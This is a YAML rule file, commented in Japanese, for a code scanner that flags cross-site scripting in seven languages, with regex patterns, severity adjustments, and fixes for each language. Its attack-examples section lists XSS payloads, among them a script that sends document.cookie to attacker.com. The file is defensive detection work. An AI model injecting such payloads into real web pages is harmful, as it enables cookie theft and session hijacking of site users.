# XSS (Cross-Site Scripting) Vulnerability ルール定義

rule:
  id: "SEC_XSS"
  category: "security"
  name: "XSS Vulnerability"
  description: "ユーザー入力を未エスケープでHTML出力することによるXSS攻撃の脆弱性"
  base_severity: 9

  # 言語ごとの検出パターン
  patterns:
    php:
      - pattern: 'echo\s+\$_(GET|POST|REQUEST|COOKIE)\['
        context: "Direct echo of user input without escaping"

      - pattern: 'print\s+\$_(GET|POST|REQUEST)\['
        context: "Direct print of user input"

      - pattern: '<\?=\s*\$_(GET|POST|REQUEST)'
        context: "Short echo tag with user input"

      - pattern: '\$\w+\s*=\s*\$_(GET|POST|REQUEST)[^;]*echo\s+\$\w+'
        context: "Variable from user input echoed without escaping"

    csharp:
      - pattern: '@(Html\.Raw|Model\.\w+)\s*\(\s*(Request\.|ViewBag\.)'
        context: "Html.Raw with Request/ViewBag data"

      - pattern: 'Response\.Write\s*\(\s*Request\.(Query|Form|Params)'
        context: "Response.Write with Request data"

      - pattern: '<script>.*@(Request\.|ViewBag\.)'
        context: "User input in script tag"

    java:
      - pattern: 'out\.print(ln)?\s*\(\s*request\.getParameter'
        context: "PrintWriter with request parameter"

      - pattern: '<script>.*<%= request\.getParameter'
        context: "JSP scriptlet with request parameter"

      - pattern: '\$\{param\.\w+\}'
        context: "EL expression with param without escaping"

    javascript:
      - pattern: 'innerHTML\s*=.*req\.(query|params|body)'
        context: "innerHTML assignment with request data"

      - pattern: 'document\.write\s*\(.*req\.'
        context: "document.write with request data"

      - pattern: '\$\(["`].*["`]\)\.html\s*\(.*req\.'
        context: "jQuery .html() with request data"

    typescript:
      - pattern: 'dangerouslySetInnerHTML.*\{\s*__html:\s*.*req\.(query|params|body)'
        context: "React dangerouslySetInnerHTML with request data"

      - pattern: 'this\.innerHTML\s*=.*this\.route\.snapshot\.params'
        context: "Angular innerHTML with route params"

    python:
      - pattern: 'render_template_string\s*\(.*request\.(args|form|values)'
        context: "Flask render_template_string with request data"

      - pattern: 'return\s+["''].*\{\}.*["'']\.format\(.*request\.(GET|POST)'
        context: "Django HttpResponse with .format() and request data"

      - pattern: 'mark_safe\s*\(.*request\.(GET|POST)'
        context: "Django mark_safe with request data"

    go:
      - pattern: 'template\.HTML\s*\(.*r\.(URL\.Query|Form|PostForm)'
        context: "Go template.HTML with request data"

      - pattern: 'fmt\.Fprintf\(.*"<script>.*%s'
        context: "Fprintf with script tag and user data"

  # 技術スタックによる深刻度調整
  context_modifiers:
    # エスケープ処理あり（安全）
    - condition:
        code_context: 'htmlspecialchars|htmlentities|h\(|escape|sanitize'
      action:
        severity_adjustment: -7
        note: "HTMLエスケープ処理が実装されています。安全です。"

    - condition:
        tech_stack_has: "React"
        code_context: '\{.*\}(?!.*dangerouslySetInnerHTML)'
      action:
        severity_adjustment: -6
        note: "ReactのJSX自動エスケープが有効です。"

    - condition:
        tech_stack_has: "Angular"
        code_context: '\{\{.*\}\}(?!.*innerHTML)'
      action:
        severity_adjustment: -6
        note: "Angularの補間は自動的にエスケープされます。"

    - condition:
        tech_stack_has: "Vue"
        code_context: '\{\{.*\}\}|v-text'
      action:
        severity_adjustment: -6
        note: "Vueのテンプレート補間は安全です。v-htmlに注意。"

    # テンプレートエンジンの自動エスケープ
    - condition:
        code_context: '@Html\.Display|@Html\.Encode'
      action:
        severity_adjustment: -6
        note: "Razor自動エスケープが有効です。"

    - condition:
        tech_stack_has: "Laravel"
        code_context: '\{\{\s*\$'
      action:
        severity_adjustment: -6
        note: "Bladeテンプレートの {{ }} は自動エスケープされます。"

    - condition:
        tech_stack_has: "Django"
        code_context: '\{\{\s*.*\s*\}\}(?!.*\|safe)'
      action:
        severity_adjustment: -6
        note: "Djangoテンプレートの {{ }} は自動エスケープされます。"

    # Content Security Policy (CSP) 有効
    - condition:
        code_context: 'Content-Security-Policy|CSP'
      action:
        severity_adjustment: -2
        note: "CSPが設定されていますが、エスケープは依然として必要です。"

  # 技術スタック別の推奨修正方法
  fixes:
    php:
      - "htmlspecialchars使用: echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');"
      - "Laravelの {{ }}: {{ $request->input('name') }} （自動エスケープ）"
      - "filter_var: echo filter_var($input, FILTER_SANITIZE_FULL_SPECIAL_CHARS);"

    csharp:
      - "@Html.Encode使用: @Html.Encode(Model.UserInput)"
      - "Razor自動エスケープ: @Model.UserInput （Html.Rawを使わない）"
      - "AntiXssEncoder: Encoder.HtmlEncode(userInput)"

    java:
      - "JSTL <c:out>: <c:out value='${param.name}'/>"
      - "StringEscapeUtils: StringEscapeUtils.escapeHtml4(input)"
      - "OWASP Java Encoder: Encode.forHtml(input)"

    javascript:
      - "textContent使用: element.textContent = userInput; （innerHTMLの代わり）"
      - "DOMPurify: element.innerHTML = DOMPurify.sanitize(userInput);"
      - "createTextNode: element.appendChild(document.createTextNode(userInput));"

    typescript:
      - "React: {userInput} （JSX自動エスケープ）"
      - "Angular: {{ userInput }} （自動エスケープ）、[textContent]='userInput'"
      - "DOMPurify: this.sanitizer.sanitize(SecurityContext.HTML, userInput)"

    python:
      - "Django: {{ user_input }} （自動エスケープ）"
      - "Flask: {{ user_input|e }}"
      - "Jinja2 autoescape: {% autoescape true %}"
      - "bleach: bleach.clean(user_input)"

    go:
      - "html/template: {{ . }} （自動エスケープ）"
      - "text/template → html/template に変更"
      - "template.HTMLEscapeString(input)"

  # 脆弱性の影響
  security_impact:
    - "セッションハイジャック（Cookie盗難）"
    - "フィッシング攻撃（偽のログインフォーム表示）"
    - "マルウェア配布"
    - "ページ改ざん"
    - "個人情報の窃取"
    - "CSRF トークンの盗難"

  # 実際の攻撃例
  attack_examples:
    - "<script>alert(document.cookie)</script> （Cookie盗難）"
    - "<script>window.location='http://attacker.com?cookie='+document.cookie</script>"
    - "<img src=x onerror='alert(1)'> （イベントハンドラ悪用）"
    - "<iframe src='javascript:alert(1)'> （iframe悪用）"
    - "<svg onload='alert(1)'> （SVG悪用）"

  # XSSの種類
  xss_types:
    reflected:
      description: "リクエストパラメータがそのままレスポンスに反映される"
      example: "?search=<script>alert(1)</script>"

    stored:
      description: "DBに保存された悪意のあるスクリプトが表示される"
      example: "コメント投稿機能での永続的XSS"

    dom_based:
      description: "JavaScriptによるDOM操作で発生"
      example: "location.hash を innerHTML に設定"

  # 追加情報
  references:
    - "https://owasp.org/www-community/attacks/xss/"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
    - "https://cwe.mitre.org/data/definitions/79.html"
